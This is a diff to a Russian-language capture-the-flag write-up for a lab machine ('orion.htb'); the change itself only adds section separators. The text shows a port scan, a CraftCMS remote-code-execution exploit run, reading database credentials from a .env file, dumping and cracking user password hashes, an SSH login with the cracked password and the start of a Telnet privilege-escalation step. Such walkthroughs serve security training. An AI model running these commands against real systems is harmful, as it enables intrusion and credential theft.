@@ -32,6 +32,7 @@ nmap -sC -sV -p- 10.129.93.166
 Port	Service	Version
 22/tcp	SSH	OpenSSH 8.9p1
 80/tcp	HTTP	nginx 1.18.0
+---
 🌐 Web — CraftCMS RCE
 На странице /admin/login определена версия CraftCMS 5.6.16.
 
@@ -43,6 +44,7 @@ python3 exploit.py -u http://orion.htb -c "id"
 
 text
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+---
 🗄️ MySQL — пароль из .env
 Через тот же эксплойт читаем .env:
 
@@ -57,11 +59,12 @@ CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
 bash
 python3 exploit.py -u http://orion.htb -c "mysql -u root -p'SuperSecureCraft123Pass!' -D orion -e 'SELECT password FROM users;'"
 Хеш взломан через John/Hashcat → darkangel.
-
+---
 🔑 SSH — доступ как adam
 bash
 ssh adam@10.129.93.166
 Password: darkangel
+---
 🔐 Privilege Escalation — Telnet CVE-2026-24061
 Проверяем локальные порты:
 
